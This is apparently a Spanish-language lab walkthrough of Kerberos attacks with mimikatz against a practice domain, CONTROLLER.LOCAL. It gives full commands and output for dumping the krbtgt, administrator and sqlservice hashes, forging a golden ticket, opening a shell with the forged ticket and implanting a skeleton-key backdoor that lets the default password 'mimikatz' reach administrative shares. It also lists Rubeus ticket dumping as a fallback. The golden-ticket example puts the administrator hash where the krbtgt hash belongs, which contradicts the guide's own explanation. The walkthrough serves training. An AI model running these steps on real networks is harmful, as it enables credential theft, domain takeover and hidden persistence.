PS C:\Users\Administrator\Downloads> klist

Current LogonId is 0:0x7a2df

Cached Tickets: (3)

#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 8/20/2025 12:58:11 (local)
        End Time:   8/20/2025 22:58:11 (local)
        Renew Time: 8/27/2025 12:58:11 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/HTTPService.CONTROLLER.local:30222 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/20/2025 13:13:08 (local)
        End Time:   8/20/2025 22:58:11 (local)
        Renew Time: 8/27/2025 12:58:11 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

#2>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/SQLService.CONTROLLER.local:30111 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/20/2025 13:13:08 (local)
        End Time:   8/20/2025 22:58:11 (local)
        Renew Time: 8/27/2025 12:58:11 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1
PS C:\Users\Administrator\Downloads>



dir \\10.201.0.52\admin$

```










# Ataques con entradas Golden/Silver Ticket con mimikatz

* Mimikatz es una herramienta de postexplotación muy popular y potente, comúnmente utilizada para volcar credenciales de usuario dentro de una red de Active Directory. Sin embargo, usaremos Mimikatz para crear un ticket plateado.

* Un ticket plateado a veces es más útil en interacciones que un ticket dorado, ya que es un poco más discreto. Si la discreción y la invisibilidad son importantes, un ticket plateado probablemente sea una mejor opción que un ticket dorado; sin embargo, el enfoque para crearlo es exactamente el mismo. La diferencia clave entre ambos tickets es que un ticket plateado se limita al servicio objetivo, mientras que un ticket dorado tiene acceso a cualquier servicio Kerberos.

* Un escenario de uso específico para un ticket plateado sería si se desea acceder al servidor SQL del dominio, pero el usuario comprometido no tiene acceso a él. Se puede encontrar una cuenta de servicio accesible para establecerse mediante Kerberos en ese servicio. Luego, se puede volcar el hash del servicio y suplantar su TGT para solicitar un ticket de servicio para el servicio SQL del KDC, lo que permite acceder al servidor SQL del dominio. Descripción general de KRBTGT

Para comprender completamente cómo funcionan estos ataques, es necesario comprender la diferencia entre un KRBTGT y un TGT. Un KRBTGT es la cuenta de servicio del KDC, el Centro de Distribución de Claves que emite todos los tickets a los clientes. Si se suplanta esta cuenta y se crea un ticket dorado desde el KRBTGT, se obtiene la capacidad de crear un ticket de servicio para cualquier necesidad. Un TGT es un ticket para una cuenta de servicio emitida por el KDC y solo puede acceder al servicio del que proviene, como el ticket de SQLService.

Descripción general del ataque de ticket dorado/plateado

* Un ataque de ticket dorado funciona mediante el volcado del ticket que otorga el ticket de cualquier usuario del dominio; preferiblemente, sería un administrador del dominio. Sin embargo, para un ticket dorado, se volcaría el ticket krbtgt, y para un ticket plateado, cualquier ticket de administrador de servicio o dominio. Esto le proporcionará el SID o identificador de seguridad de la cuenta de administrador de servicio/dominio, que es un identificador único para cada cuenta de usuario, así como el hash NTLM. Luego, utiliza estos detalles dentro de un ataque de ticket dorado de mimikatz para crear un TGT que suplanta la información de la cuenta de servicio proporcionada.

Alternativas si Mimikatz Falla
Rubeus (herramienta C# para Kerberos):

```bash
Rubeus.exe dump /nowrap


Rubeus.exe dump /nowrap /outfile:tickets.kirbi
```

## Dump the krbtgt hash -



privilege::debug 

### Esto volcará el hash y el identificador de seguridad necesarios para crear un Golden Ticket. Para crear un Silver Ticket, debes cambiar el comando /name: para volcar el hash de una cuenta de administrador de dominio o de una cuenta de servicio, como SQLService.


lsadump::lsa /inject /name:krbtgt



```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223

mimikatz #
```


## Pero necesitamos el hash krbtgt del administrador y sqlservice para eso haremos:
```
lsadump::lsa /inject /name:administrador 
lsadump::lsa /inject /name::sqlservice


mimikatz # lsadump::lsa /inject /name:administrator
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 000001f4 (500)
User : administrator

 * Primary
    NTLM : 2777b7fec870e04dda00cd7260f7bee6
    LM   :
  Hash NTLM: 2777b7fec870e04dda00cd7260f7bee6

 * Kerberos
    Default Salt : WIN-G83IJFV2N03Administrator
    Credentials
      des_cbc_md5       : 918abaf7dcb02ce6

 * Kerberos-Newer-Keys
    Default Salt : WIN-G83IJFV2N03Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 42b3c13c8c0fef3175eb2b5926f805f919123efd001a9c5a16ee9a86101e32b4
      aes128_hmac       (4096) : d01d6ccf97a2ee214ec7185173a3b659
      des_cbc_md5       (4096) : 918abaf7dcb02ce6

 * NTLM-Strong-NTOWF
    Random Value : 7bfd4ae86442827fb0db294d5c9855ce

mimikatz #



mimikatz # lsadump::lsa /inject /name:sqlservice
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 00000455 (1109)
User : sqlservice

 * Primary
    NTLM : cd40c9ed96265531b21fc5b1dafcfb0a
    LM   :
  Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a
    ntlm- 0: cd40c9ed96265531b21fc5b1dafcfb0a
    lm  - 0: 7bb53f77cde2f49c17190f7a071bd3a0

 * WDigest
    01  ba42b3f2ef362e231faca14b6dea61ef
    02  00a0374f4ac4bce4adda196e458dd8b8
    03  f39d8d3e34a4e2eac8f6d4b62fe52d06
    04  ba42b3f2ef362e231faca14b6dea61ef
    05  98c65218e4b7b8166943191cd8c35c23
    06  6eccb56cda1444e3909322305ed04b37
    07  25b7998ce2e7b826a576a43f89702921
    08  8609a1da5628a4016d32f9eb73314fa0
    09  277f84c6c59728fb963a6ee1a3b27f0d
    10  63a9f69e8b36c3e0612ec8784b9c7599
    11  47cb5c436807396994f1b9ccc8d2f8e1
    12  46f2c402d8731ed6dca07f5dbc71a604
    13  2990e284070a014e54c749a6f96f9be7
    14  c059f85b7f01744dc0a2a013978a965f
    15  3600c835f3e81858a77e74370e047e29
    16  bd9c013f8a3f743f8a5b553e8a275a88
    17  c1d94e24d26fdaad4d6db039058c292e
    18  1a433c0634b50c567bac222be4eac871
    19  78d7a7573e4af2b8649b0280cd75636d
    20  136ddfa7840610480a76777f3be007e0
    21  7a4a266a64910bb3e5651994ba6d7fb4
    22  a75ec46a7a473e90da499c599bc3d3cb
    23  8d3db50354c0744094334562adf74c2a
    24  7d07406132d671f73a139ff89da5d72e
    25  dd1e02d5c5b8ae969d903a0bc63d9191
    26  27da7fc766901eac79eba1a970ceb7da
    27  09333600bcc68ee149f449321a5efb27
    28  1c550f8b3af2eb4efda5c34aa8a1c549
    29  3cd9326a300d2261451d1504832cb062

 * Kerberos
    Default Salt : CONTROLLER.LOCALSQLService
    Credentials
      des_cbc_md5       : 5d5dae0dc10e7aec

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALSQLService
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a3a6dbd4d6fa895b600c28bfdaf6b52d59d46a6eb1f455bc08a19b7e8cdab76d
      aes128_hmac       (4096) : 629b46af543142f77cabcf14afb1caea
      des_cbc_md5       (4096) : 5d5dae0dc10e7aec

 * NTLM-Strong-NTOWF
    Random Value : 7e9547ab69f52e42450903ebbe6ad6ec

mimikatz #


```





# Create a Golden/Silver Ticket - 


### Este es el comando para crear un ticket dorado. Para crear un ticket plateado, simplemente introduzca el hash NTLM del servicio en la ranura krbtgt, el SID de la cuenta de servicio en "sid" y cambie el ID a 1103.

### Le mostraré una demostración de cómo crear un ticket dorado. La creación de un ticket plateado depende de usted.
```
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:



# Syntax 
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:  
# Command 

# sid,krbtgt,id we can get from the lsadump results 
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:2777b7fec870e04dda00cd7260f7bee6 /id:500



mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:2777b7fec870e04dda00cd7260f7bee6 /id:500
User      : Administrator
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-432953485-3795405108-1502158860
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 2777b7fec870e04dda00cd7260f7bee6 - rc4_hmac_nt
Lifetime  : 8/20/2025 2:26:35 PM ; 8/18/2035 2:26:35 PM ; 8/18/2035 2:26:35 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz #

```


## Use the Golden/Silver Ticket to access other machines -

* esto abrirá un nuevo símbolo del sistema con privilegios elevados con el ticket proporcionado en mimikatz.

```
misc::cmd
```
* Accede a las máquinas que desees. El acceso dependerá de los privilegios del usuario del que tomaste el ticket. Sin embargo, si lo tomaste de krbtgt, tendrás acceso a toda la red, de ahí el nombre de ticket dorado. Sin embargo, los tickets plateados solo tienen acceso a las máquinas a las que el usuario tiene acceso. Si es administrador de dominio, puede acceder a casi toda la red; sin embargo, su nivel de privilegios es ligeramente inferior al de un ticket dorado.


# Kerberos Backdoors w/ mimikatz

Además de mantener el acceso mediante tickets dorados y plateados, mimikatz tiene otro as bajo la manga para atacar Kerberos. A diferencia de los ataques con tickets dorados y plateados, una puerta trasera Kerberos es mucho más sutil, ya que actúa de forma similar a un rootkit al implantarse en la memoria del bosque del dominio, lo que le permite acceder a cualquier máquina con una contraseña maestra.

La puerta trasera Kerberos funciona implantando una clave maestra que vulnera la forma en que AS-REQ valida las marcas de tiempo cifradas. Una clave maestra solo funciona con el cifrado RC4 de Kerberos.

El hash predeterminado para una clave maestra de mimikatz es 60BA4FCADC466C7A033C178194C03DF6, que convierte la contraseña en "mimikatz".

Esta sección es solo una descripción general y no requiere que realice ninguna acción en la máquina. Sin embargo, le recomiendo que continúe, agregue otras máquinas y pruebe con claves maestras de mimikatz.

Descripción general de la clave maestra -

La clave maestra funciona aprovechando las marcas de tiempo cifradas de AS-REQ. Como se mencionó anteriormente, la marca de tiempo se cifra con el hash NT del usuario. El controlador de dominio intenta descifrar esta marca de tiempo con dicho hash. Una vez implantada la clave maestra, el controlador de dominio intenta descifrarla utilizando tanto el hash NT del usuario como el de la clave maestra, lo que permite el acceso al bosque del dominio.

```
misc::skeleton

mimikatz # misc::skeleton
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK

mimikatz
```
Accessing the forest - 

The default credentials will be: "mimikatz"

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.